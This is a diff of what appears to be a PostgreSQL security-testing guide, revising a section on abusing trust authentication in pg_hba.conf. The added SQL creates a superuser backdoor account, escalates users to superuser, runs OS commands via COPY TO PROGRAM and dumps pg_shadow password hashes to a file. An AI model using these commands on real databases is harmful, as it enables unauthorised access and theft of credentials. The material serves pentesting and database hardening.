@@ -130,22 +130,44 @@ host    all       all   0.0.0.0/0     scram-sha-256
 | `cert`          | High     | SSL certificate authentication              |
 | `reject`        | N/A      | Always reject connection                    |
 
-**Exploiting Trust Authentication:**
+**Exploiting Trust Authentication (Superuser Access):**
 
-If local trust authentication is configured and you have superuser access (or can exploit trust auth to gain it):
-
-**Note:** `GRANT pg_execute_server_program` requires superuser privileges. The workflow below assumes you have already obtained elevated access (e.g., via trust authentication allowing passwordless superuser login, or existing superuser credentials). Without superuser, the GRANT will fail.
+If `pg_hba.conf` has trust authentication for superuser accounts (e.g., `local all postgres trust`), you can connect without a password and directly execute privileged operations:
 
 ```sql
--- Requires superuser: grant command execution capability
-GRANT pg_execute_server_program TO current_user;
+-- Connect as superuser via trust auth (no password needed)
+-- psql -U postgres
 
--- Then use COPY TO PROGRAM (requires pg_execute_server_program role)
-COPY (SELECT '') TO PROGRAM 'psql -U postgres -c "ALTER USER attacker WITH SUPERUSER"';
+-- Direct superuser actions (no GRANT needed - superusers have all capabilities):
+-- Create backdoor account
+CREATE USER backdoor WITH SUPERUSER PASSWORD 'secret';
 
--- Or create a backdoor user
-COPY (SELECT '') TO PROGRAM 'psql -U postgres -c "CREATE USER backdoor WITH SUPERUSER PASSWORD ''secret''"';
+-- Modify existing user
+ALTER USER target_user WITH SUPERUSER;
+
+-- Execute OS commands directly
+COPY (SELECT '') TO PROGRAM 'id > /tmp/whoami.txt';
+
+-- Exfiltrate data
+COPY (SELECT * FROM pg_shadow) TO '/tmp/hashes.txt';
 ```
+
+**Non-Superuser Privilege Escalation via pg_execute_server_program:**
+
+If you have a non-superuser account but can convince a superuser to grant you dangerous roles, or if misconfigured:
+
+```sql
+-- Requires a superuser to run this GRANT:
+GRANT pg_execute_server_program TO limited_user;
+
+-- Once granted, the non-superuser can execute OS commands:
+COPY (SELECT '') TO PROGRAM 'whoami > /tmp/test.txt';
+
+-- If trust auth exists for superuser, escalate via shell:
+COPY (SELECT '') TO PROGRAM 'psql -U postgres -c "ALTER USER limited_user WITH SUPERUSER"';
+```
+
+**Note:** `pg_execute_server_program` (PostgreSQL 11+) allows command execution without full superuser. This is a privilege escalation path if granted to untrusted users.
 
 **Checking Authentication Method via pg_hba_file_rules (PostgreSQL 10+):**
 
